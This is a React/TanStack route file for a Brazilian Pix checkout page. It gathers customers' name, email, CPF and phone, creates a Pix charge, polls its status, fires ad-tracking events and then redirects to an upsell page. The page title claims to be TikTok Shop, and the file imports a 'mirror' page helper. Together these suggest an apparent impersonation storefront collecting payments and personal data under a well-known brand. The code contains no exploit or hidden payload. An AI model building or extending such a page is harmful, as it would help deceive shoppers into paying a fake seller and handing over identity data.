import { useEffect, useRef, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { mirrorHead } from "@/components/MirrorPage";
import { type Address, loadAddress } from "@/lib/address";
import { createPix, getPixStatus, type PixProduct } from "@/lib/pix.functions";

import { getCampaignParameters, trackPayment } from "@/lib/ad-tracking";
import { confirmInitialOrder } from "@/lib/order-receipt";

export const Route = createFileRoute("/pagamento")({
  validateSearch: (s: Record<string, unknown>) => ({
    p: (s["p"] === "w3" ? "w3" : "ferramenta") as PixProduct,
  }),
  head: mirrorHead("Pagamento via Pix | TikTok Shop", "Pague com Pix para confirmar seu pedido."),
  component: Pagamento,
});


function Pagamento() {
  const { p } = Route.useSearch();
  const navigate = useNavigate();
  const create = useServerFn(createPix);
  const status = useServerFn(getPixStatus);
  const [tx, setTx] = useState<{ id: string; copy: string; qr: string; amount: number } | null>(null);
  const shippingAddress = useRef<Address | null>(null);
  const [err, setErr] = useState("");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    const a = loadAddress();
    if (!a) {
      navigate({ to: "/endereco", search: { funnel: p === "w3" ? "/w3" : "/ferramenta" } });
      return;
    }
    shippingAddress.current = a;
    getCampaignParameters().catch(() => ({})).then(utm => create({ data: { product: p, customer: { name: a.nome, email: a.email, cpf: a.cpf, phone: a.telefone }, utm } }))
      .then((r) => {
        if (!r.pix) throw new Error("Pix indisponível");
        setTx({ id: r.id, copy: r.pix.copy_paste, qr: r.pix.qr_code, amount: r.amount_cents });
      })
      .catch(() => setErr("Não foi possível gerar o Pix. Tente novamente."));
  }, [p]);

  // Only after BravoPay confirms the payment do we send the customer to the upsell.
  useEffect(() => {
    if (!tx) return;
    const t = setInterval(async () => {
      try {
        const r = await status({ data: { id: tx.id } });
        if (r.status === "PAID") {
          const address = shippingAddress.current;
          if (!address) return;
          confirmInitialOrder(r.status, tx.id, p, address);
          await trackPayment(r.status, tx.id, tx.amount, p).catch(() => false);
          clearInterval(t);
          navigate({ to: "/upsell" });
        }
      } catch {}
    }, 4000);
    return () => clearInterval(t);
  }, [tx]);

  const qrSrc = tx
    ? tx.qr.startsWith("data:") || tx.qr.startsWith("http")
      ? tx.qr
      : `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(tx.copy)}`
    : "";

  return (
    <div className="min-h-screen w-full bg-[#e5e5e7]">
      <div className="mx-auto min-h-screen w-full max-w-[440px] bg-white px-5 pb-10 pt-8 text-center text-[#161823]">
        <h1 className="text-[18px] font-bold">Pague com Pix</h1>
        <p className="mt-1 text-[13px] text-[#5a5b60]">Seu pedido é confirmado assim que o pagamento for aprovado.</p>
        {err && (
          <div className="mt-6">
            <p className="text-[14px] text-[#fe2c55]">{err}</p>
            <button onClick={() => window.location.reload()} className="mt-4 w-full rounded-full bg-[#fe2c55] py-2.5 font-semibold text-white">Tentar novamente</button>
          </div>
        )}
        {!err && !tx && <p className="mt-10 text-[14px] text-[#8a8b91]">Gerando seu Pix...</p>}
        {tx && (
          <>
            <div className="mt-4 text-[24px] font-extrabold text-[#fe2c55]">
              R$ {(tx.amount / 100).toFixed(2).replace(".", ",")}
            </div>
            <img src={qrSrc} alt="QR Code Pix" className="mx-auto mt-4 h-[240px] w-[240px]" />
            <div className="mt-4 break-all rounded-md bg-[#f5f5f5] p-3 text-left text-[12px] text-[#5a5b60]">{tx.copy}</div>
            <button
              onClick={() => {
                navigator.clipboard.writeText(tx.copy).then(() => setCopied(true));
              }}
              className="mt-3 w-full rounded-full bg-[#fe2c55] py-2.5 text-[15px] font-semibold text-white"
            >
              {copied ? "Código copiado!" : "Copiar código Pix"}
            </button>
            <p className="mt-5 flex items-center justify-center gap-2 text-[13px] text-[#8a8b91]">
              <span className="inline-block h-2 w-2 animate-pulse rounded-full bg-[#00b8a9]" />
              Aguardando pagamento...
            </p>
          </>
        )}
      </div>
    </div>
  );
}
